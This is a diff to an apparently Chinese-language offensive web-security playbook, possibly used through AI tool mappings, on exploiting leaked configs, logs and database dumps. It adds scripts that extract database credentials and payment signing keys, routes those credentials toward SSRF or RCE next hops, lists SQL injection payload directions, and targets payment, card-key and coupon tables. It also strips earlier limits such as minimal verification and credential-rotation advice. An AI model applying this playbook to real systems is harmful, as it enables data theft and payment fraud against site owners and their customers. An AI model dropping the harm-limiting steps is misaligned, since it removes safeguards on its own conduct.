+| `phpinfo()` | `DOCUMENT_ROOT`, `open_basedir`, 环境变量 | 反推源码路径和 `php://filter` 读取路径 |
+| `composer.lock` / `package-lock.json` | 框架与支付 SDK 版本 | 转入平台指纹与 CVE pipeline |
+| `STRIPE_SECRET`, `ALIPAY_PRIVATE_KEY`, `WECHATPAY_KEY` | 支付签名材料 | 构造合法回调或验证签名实现 |
+
 ## 1. 常见配置文件路径
 
 ### 1.1 PHP 应用
@@ -31655,6 +31676,60 @@ Flask debug mode → 代码执行
 - `open_basedir`（目录访问限制）
 - `Loaded Configuration File`（php.ini 路径）
 
+## 8. 连接串解析与下一跳生成
+
+把泄露内容统一解析成结构化 JSON，后续 SQLi、备份、支付回调都能复用。
+
+```python
+import json
+import re
+from urllib.parse import urlparse, parse_qs
+
+ENV_RX = re.compile(r"^([A-Z0-9_]+)\s*=\s*(.*)$", re.M)
+DSN_RX = re.compile(r"(?P<scheme>mysql|postgres|postgresql|redis|mongodb|sqlserver)://[^\s'\"<>]+", re.I)
+
+def parse_config_blob(text):
+    env = {m.group(1): m.group(2).strip().strip("'\"") for m in ENV_RX.finditer(text)}
+    dsns = []
+    for m in DSN_RX.finditer(text):
+        u = urlparse(m.group(0))
+        dsns.append({
+            "raw": m.group(0),
+            "scheme": u.scheme,
+            "host": u.hostname,
+            "port": u.port,
+            "user": u.username,
+            "password_set": bool(u.password),
+            "database": u.path.lstrip("/"),
+            "query": parse_qs(u.query),
+        })
+    hints = []
+    for k in ("DB_HOST", "MYSQL_HOST", "POSTGRES_HOST", "REDIS_HOST", "MONGO_HOST"):
+        if k in env:
+            hints.append({"type": "host_field", "key": k, "value": env[k]})
+    for k in ("DB_DATABASE", "DB_USERNAME", "DB_PASSWORD", "DB_PORT"):
+        if k in env:
+            hints.append({"type": "db_field", "key": k, "value": env[k]})
+    for k in ("STRIPE_SECRET", "ALIPAY_PRIVATE_KEY", "WECHATPAY_KEY", "PAY_KEY"):
+        if k in env:
+            hints.append({"type": "payment_secret", "key": k, "value_hint": env[k][:12]})
+    return {"env": env, "dsns": dsns, "hints": hints}
+
+if __name__ == "__main__":
+    import sys
+    print(json.dumps(parse_config_blob(open(sys.argv[1], encoding="utf-8", errors="ignore").read()), ensure_ascii=False, indent=2))
+```
+
+### 凭证作用域判定
+
+| Host 形态 | 可能含义 | 动作 |
+|-----------|----------|------|
+| `127.0.0.1`, `localhost` | Web 与 DB 同机 | 找 LFI/SSRF/命令执行入口 |
+| `mysql`, `db`, `redis` | Docker Compose 服务名 | 读 `docker-compose.yml`，确认容器网络 |
+| `10.x`, `172.16-31.x`, `192.168.x` | 内网数据库 | 走 SSRF/Gopher/内网代理 |
+| `*.rds.amazonaws.com`, `*.aliyuncs.com` | 云数据库 | 判断公网可达、白名单、账号权限 |
+| `unix_socket` | 本机 socket | LFI/RCE 后直连 socket |
+
 ## 攻击链 / 工作流
 
 ```
@@ -31662,9 +31737,9 @@ Flask debug mode → 代码执行
 2. 结合目录遍历、源码泄露、备份文件、php filter 或 debug 页面读取配置
 3. 提取连接字符串、DB_HOST、DB_USER、DB_PASS、Redis/Mongo URI 等字段
 4. 判断凭证作用域：本地数据库、内网数据库、云 RDS、缓存服务、消息队列
-5. 只做最小登录/版本/权限验证，避免写入或修改业务数据
-6. 关联后续链路：SQLi 文件读写、NoSQL 未授权、备份下载、管理后台登录
-7. 记录泄露路径和凭证字段片段，输出清理与轮换建议
+5. 连接后先抓版本、当前库、当前用户、表名前缀和权限位
+6. 关联后续链路：SQLi 文件读写、NoSQL 未授权、备份下载、管理后台登录、支付回调签名
+7. 记录泄露路径、字段片段、连接结果、下一跳入口和失败分支
 ```
 
 ## Evidence
@@ -31675,7 +31750,8 @@ Flask debug mode → 代码执行
 | 配置字段 | host/user/database/driver/port 字段样例 |
 | 访问验证 | 登录成功、版本查询、权限边界 |
 | 环境信息 | phpinfo/debug 页面中的 DOCUMENT_ROOT、open_basedir、框架版本 |
-| 约束效果 | 文件不可读、debug 关闭、凭证轮换后旧凭证失效 |
+| 下一跳 | 可读表、可达内网服务、支付密钥、管理后台或备份路径 |
+| 失败样本 | 403/404、连接超时、账号无权限、host 只在容器内解析 |
 
 ## MCP 工具映射
 
@@ -31691,6 +31767,7 @@ Flask debug mode → 代码执行
 - [[01-sqli-fundamentals]] — 获凭证后连接数据库
 - [[03-nosql-injection]] — NoSQL 未授权
 - [[05-backup-log-leak]] — 备份文件暴露
+- [[../12-payment/payment-callback-async]] — 支付密钥与回调签名
 - [[file-upload-xxe-lfi]] — 文件读取
 
 
@@ -31864,6 +31941,33 @@ def scan_log(text):
 
 日志里看到 `SELECT ... WHERE username='x'`，可以反推注入闭合方式；看到 `INSERT INTO users`，可以直接定位用户表字段顺序。
 
+### 3.4 从日志反推 SQLi payload
+
+日志里的 SQL 模板是最好的 payload 生成器。不要只搜 `password`，还要搜支付表的订单号、金额、卡密、回调字段。
+
+| 日志片段 | SQL 上下文 | Payload 方向 |
+|----------|------------|--------------|
+| `WHERE id = 123` | 整数条件 | `1 AND 1=2`、`UNION SELECT` |
+| `WHERE email = 'a@b.com'` | 字符串条件 | `' AND '1'='2`、报错函数 |
+| `ORDER BY created_at desc` | 排序上下文 | `CASE WHEN(...) THEN created_at ELSE id END` |
+| `LIMIT 20 OFFSET 0` | 分页上下文 | 超大/负数/子查询表达式 |
+| `INSERT INTO orders (...) VALUES (...)` | 写入上下文 | 二阶注入、字段错位 |
+| `UPDATE orders SET status='paid'` | 支付状态更新 | 状态机与回调重放 |
+
+```python
+import re
+
+SQL_RX = re.compile(r"\b(SELECT|INSERT|UPDATE|DELETE)\b.{0,600}", re.I | re.S)
+PAY_FIELDS = re.compile(r"(order|trade|amount|price|paid|status|coupon|card|key|token|flag)", re.I)
+
+def extract_sql_templates(log_text):
+    for m in SQL_RX.finditer(log_text):
+        sql = " ".join(m.group(0).split())
+        score = len(PAY_FIELDS.findall(sql))
+        if score:
+            print(f"[score={score}] {sql[:500]}")
+```
+
 ## 4. 安装文件残留
 
 ### 4.1 安装目录
@@ -31984,16 +32088,58 @@ def summarize_sql_dump(path):
 
 遇到大 dump：先 `rg -n "flag\\{|CTF\\{|admin|password|token|secret" dump.sql`，再按表拆分；不要先整库导入。
 
+### 6.3 支付/发卡表定位
+
+支付题拿到 dump 后，优先找“订单账本”和“权益账本”的断点：订单表、支付流水表、卡密表、优惠券表、发货表。
+
+```python
+import re
+from pathlib import Path
+
+TABLE_HINTS = re.compile(
+    r"(order|trade|payment|pay_|invoice|refund|coupon|voucher|card|kami|cdk|license|"
+    r"goods|product|sku|plan|subscription|vip|balance|wallet|credit|flag)",
+    re.I,
+)
+
+CREATE_RX = re.compile(r"CREATE TABLE [`\"]?([^`\"\s(]+)[^;]+;", re.I | re.S)
+INSERT_RX = re.compile(r"INSERT INTO [`\"]?([^`\"\s(]+)[^;]+;", re.I | re.S)
+
+def payment_dump_map(path):
+    text = Path(path).read_text(errors="ignore")
+    tables = {}
+    for rx, kind in ((CREATE_RX, "schema"), (INSERT_RX, "sample")):
+        for name, body in rx.findall(text):
+            if TABLE_HINTS.search(name) or TABLE_HINTS.search(body):
+                item = tables.setdefault(name, {})
+                item[kind] = " ".join(body[:800].split())
+    for name, item in sorted(tables.items()):
+        print("\n==", name, "==")
+        print("[schema]", item.get("schema", "")[:600])
+        print("[sample]", item.get("sample", "")[:600])
+```
+
+字段优先级：
+
+| 表/字段 | 价值 |
+|---------|------|
+| `orders.status`, `orders.pay_status`, `paid_at` | 判断状态机终态 |
+| `orders.amount`, `pay_amount`, `total_fee` | 判断分/元、精度、折扣 |
+| `out_trade_no`, `transaction_id`, `notify_id` | 回调重放和幂等键 |
+| `card_key`, `kami`, `cdk`, `download_url` | 虚拟商品发货 |
+| `coupon.used`, `balance_log`, `wallet_log` | 重复使用与账本差异 |
+| `users.vip_until`, `subscription_until`, `credits` | 权益到账与残留 |
+
 ## 攻击链 / 工作流
 
 ```
 1. 从站点名、目录名、时间戳、部署习惯生成备份候选路径
 2. 探测 .sql/.dump/.zip/.tar.gz/.bak/.old/.log/.git 等静态资源
 3. 对命中文件先记录响应头、大小、hash，再下载到隔离目录分析
-4. 解压/解析后提取 schema、用户表、订单表、日志中的 SQL/Token/错误栈
+4. 解压/解析后提取 schema、用户表、订单表、支付流水、卡密表、日志中的 SQL/Token/错误栈
 5. 关联配置泄露与源码恢复：定位数据库连接、后台路径、框架版本
 6. 对 Git 泄露执行最小恢复，确认源码/配置/历史提交是否含敏感信息
-7. 输出影响面：泄露表、时间范围、字段类型、可独立使用资产和下一跳入口
+7. 输出影响面：泄露表、时间范围、字段类型、订单/权益账本和下一跳入口
 ```
 
 ## Evidence
@@ -32004,6 +32150,7 @@ def summarize_sql_dump(path):
 | 完整性 | SHA256、文件大小、解压后的文件列表 |
 | 数据内容 | 表名、字段名、样例行、日志关键片段 |
 | 源码恢复 | `.git/HEAD`、恢复提交、敏感文件路径 |
+| 支付账本 | 订单表、支付流水表、卡密/权益表、状态字段和金额字段 |
 
 ## MCP 工具映射
 
